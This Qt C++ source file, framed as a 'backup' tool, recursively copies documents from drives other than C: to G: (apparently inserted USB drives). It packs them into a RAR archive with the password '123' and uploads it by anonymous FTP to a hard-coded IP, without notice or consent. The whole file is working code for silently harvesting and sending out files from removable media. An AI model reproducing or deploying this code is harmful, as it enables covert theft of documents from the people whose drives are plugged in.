#include "zipfilesend.h"
#include <QCoreApplication>

MyRun::MyRun(QString path,ZipFileSend* zip)
{
    this->path=path;
    this->zip=zip;
    this->setAutoDelete(true);
}

void MyRun::run()
{
    this->zip->absolute_files_name.clear();
    this->zip->readPath(this->path);
    if(this->zip->absolute_files_name.length()==0)
        return;
    //1.1==============进行文件的复制===================
    qDebug()<<"进行文件的复制";
    foreach (QString src_file_name, this->zip->absolute_files_name) {
         QString dest_file_name=this->zip->getDestFileName(src_file_name);
         if(this->zip->choose_date_or_type=="time")
             this->zip->copyFile2(src_file_name,dest_file_name);
         else if(this->zip->choose_date_or_type=="type")
             this->zip->copyFile(src_file_name,dest_file_name);
         else
             continue;
    }
    qDebug()<<"还在线程池里面";
}

ZipFileSend::ZipFileSend(QWidget *parent)
    : QWidget(parent)
{
}

ZipFileSend::~ZipFileSend()
{

}

void ZipFileSend::readSet()
/*
 * 配置文件的设置,如果不存在则新建,存在则读取
*/
{
    QFileInfo set_ini(QCoreApplication::applicationDirPath() + "./settings.ini");
    QSettings *settor=NULL;
    if(!set_ini.exists())
    {
        qDebug()<<"新建配置文件"<<set_ini.absoluteFilePath();
        settor=new QSettings(set_ini.absoluteFilePath(),QSettings::IniFormat);
        settor->setValue("backup_init_usage/backup_way","type or time");
        settor->setValue("backup_init_usage/backup","C:/ ...");
        settor->setValue("backup_init_usage/get_file","file type(txt...),"
                              "file date(year,month,day,hour,minus,second)");
        settor->setValue("backup_init_usage/contact me","Don`t contant me");

        settor->setValue("backup_way/way","type");
        settor->setValue("filter_disk/disk","C:/,D:/,E:/,F:/,G:/");
        settor->setValue("backup/location","C:/Users/zz/Desktop/usb_backup");
        settor->setValue("get_file/type","txt,doc,docx,pdf,html");
        settor->setValue("get_file/time","20190430235903");

        settor->setValue("ftp_info/host","192.168.252.137");
        settor->setValue("ftp_info/port","21");
        settor->setValue("ftp_info/user","anonymous");
        settor->setValue("ftp_info/passwd","dontno");
        settor->setValue("ftp_info/path","./backup.zip");

    }
    else
    {
        settor=new QSettings(set_ini.absoluteFilePath(),QSettings::IniFormat);
    }
    this->choose_date_or_type=settor->value("backup_way/way").toString();
    this->filter_disk=settor->value("filter_disk/disk").toString();
    this->backup_path=settor->value("backup/location").toString();
    this->accept_file_time=settor->value("get_file/time").toString();
    foreach (QString filter, settor->value("get_file/type").toString().split(",")) {
        this->accept_file_types.append(filter);
    }
    this->ftp_host=settor->value("ftp_info/host").toString();
    this->ftp_port=settor->value("ftp_info/port").toString();
    this->ftp_user=settor->value("ftp_info/user").toString();
    this->ftp_passwd=settor->value("ftp_info/passwd").toString();
    this->ftp_path=settor->value("ftp_info/path").toString();
    qDebug()<<"过滤的盘符:"<<this->filter_disk;
    qDebug()<<"备份的位置:"<<this->backup_path;
    qDebug()<<"备份的文件类型:"<<this->accept_file_types;
    qDebug()<<"备份的文件时间:"<<this->accept_file_time;
    qDebug()<<"文件的备份方式"<<this->choose_date_or_type;

}

void ZipFileSend::readPath(QString path)
/*
 * 用于遍历路径的全部文件
 * param path:路径的名称
 * return:None
*/
{
    QDir dir;
    QFileInfoList list;
    QFileInfo file_info;
    dir.setPath(path);
    if (!dir.exists())
        return ;
    list.clear();
    list = dir.entryInfoList(QDir::Files|QDir::Hidden|QDir::Dirs,QDir::Time);
    for(int i=0;i<list.size();i++){
        file_info=list.at(i);
        if (file_info.fileName()=="." || file_info.fileName()=="..")
            continue;
        if (file_info.isDir()){
            readPath(file_info.filePath());
        }
        else{
            this->absolute_files_name<<file_info.absoluteFilePath();
        }

    }
}

bool ZipFileSend::copyFile(QString src_file, QString dest_file)
/*
 * 文件的复制,复制整个磁盘,包含文件的过滤复制(文件类型),还有就是已经
 * 存在了则不进行复制
 * param src_file: 源文件
 * param dest_file:目的文件
 * return bool:是否进行了复制
*/
{
    if(this->accept_file_types.contains(QFileInfo(dest_file).completeSuffix())){
        QFileInfo file_info(dest_file);
        if (file_info.exists())//已经复制过了,则跳出这个函数
            return false;
        QDir dir(file_info.absolutePath());
        if(!dir.exists())       //文件夹不存在则新建
            dir.mkpath(file_info.absolutePath());
        if(QFile::copy(src_file,dest_file)){
            qDebug()<<"复制"<<src_file;
            return true;
        }
        else
            return false;
    }
    return false;
}

bool ZipFileSend::copyFile2(QString src_file, QString dest_file)
/*
 * 文件的复制,复制整个磁盘,包含文件的过滤复制(创建时间),还有就是已经
 * 存在了则不进行复制,此处的过滤为了防止有大文件,多增加了大文件过滤,不需要删除就好
 * param src_file: 源文件
 * param dest_file:目的文件
 * return bool:是否进行了复制
*/
{
    QFileInfo file_info(src_file);
    if(file_info.created().toString("yyyyMMddhhmmss")>this->accept_file_time){
        if(file_info.size()>200000000)//大文件过滤200M
            return false;
        QFileInfo file(dest_file);
        if (file.exists())//已经复制过了,则跳出这个函数
            return false;
        QDir dir(file.absolutePath());
        if(!dir.exists())       //文件夹不存在则新建
            dir.mkpath(file.absolutePath());
        if(QFile::copy(src_file,dest_file)){
            qDebug()<<"复制"<<src_file;
            return true;
        }
        else
            return false;
    }
    return false;
}

QString ZipFileSend::getDestFileName(const QString &src_file_name)
/*
 * 构建新的地址,存放复制的文件
 * param src_file_name:源文件的地址
 * return:dst_file_name构建出的新文件的地址
*/
{
    QStringList file_path=src_file_name.split("/");
    QString des_file_path=this->backup_path+"/backup_file";
    for(int i=1;i<file_path.length();i++){
        des_file_path+="/"+file_path[i];
    }
    return des_file_path;
}

QStringList ZipFileSend::getDisk()
/*
 * 获取此电脑的所有的磁盘
 * param:None
 * return:磁盘的list
*/
{
    QFileInfoList list =  QDir::drives();                        //获取当前系统的盘符
    QStringList disk_list;
    QStringList accep_disk=this->filter_disk.split(",");
    for(int i=0;i<list.count();i++){
        if(!accep_disk.contains(list[i].filePath())){
                disk_list.append(list[i].filePath());
                qDebug()<<"接受了"<<list[i].filePath();
                }
    }
    return disk_list;
}

void ZipFileSend::run()
/*
 * 运行的组织结构
*/
{
    //1.==========得到所有源路径的文件名称===============
    qDebug()<<"得到所有源路径的文件名称和目的路径的文件名称";
    QThreadPool thread_pool;
    thread_pool.setMaxThreadCount(20);
    foreach (QString path,this->getDisk()) {
        thread_pool.start(new MyRun(path,this));
    }
    thread_pool.waitForDone(1000000);
    //2==============进行文件的压缩===================
    qDebug()<<"进行文件的压缩";
    QFileInfo file(this->backup_path+"/backup.zip");
    if (file.exists())
         file.dir().remove(file.fileName());

    QString sCmd = QCoreApplication::applicationDirPath()+"./rar/Rar.exe a -r -p123 "
                   ""+this->backup_path+"/backup.zip "+this->backup_path+"/backup_file/";
    QProcess::execute(sCmd);
    //3===============文件的上传========================
    this->uploadZip();
    qDebug()<<"操作完成";
}

void ZipFileSend::uploadZip()
/*
 * 上传文件到ftp
*/
{
    QNetworkReply *reply;
    QFile *file=new QFile(this->backup_path+"./backup.zip");
    qDebug()<<QFileInfo(file->fileName()).absoluteFilePath()<<this->backup_path;
    file->open(QFile::ReadOnly);
    QByteArray byte_file = file->readAll();
    QNetworkAccessManager *accessManager = new QNetworkAccessManager(this);
    accessManager->setNetworkAccessible(QNetworkAccessManager::Accessible);
    QUrl url;
    url.setScheme("ftp");
    url.setHost(this->ftp_host);
    url.setPort(this->ftp_port.toInt());
    url.setUserName(this->ftp_user);
    url.setPassword(this->ftp_passwd);
    url.setPath(this->ftp_path);
    QNetworkRequest request(url);
    reply = accessManager->put(request, byte_file);
    connect(accessManager,QOverload<QNetworkReply*>::of(&QNetworkAccessManager::finished),[]{
        qDebug()<<"上传完成";
    });
    connect(reply, QOverload<qint64 ,qint64>::of(&QNetworkReply::uploadProgress),[](qint64 i1,qint64 i2){
        qDebug()<<i1<<i2;
    });
    connect(reply,QOverload<QNetworkReply::NetworkError>::of
    (&QNetworkReply::error),[](QNetworkReply::NetworkError e){
        qDebug()<<e;
    } );


}



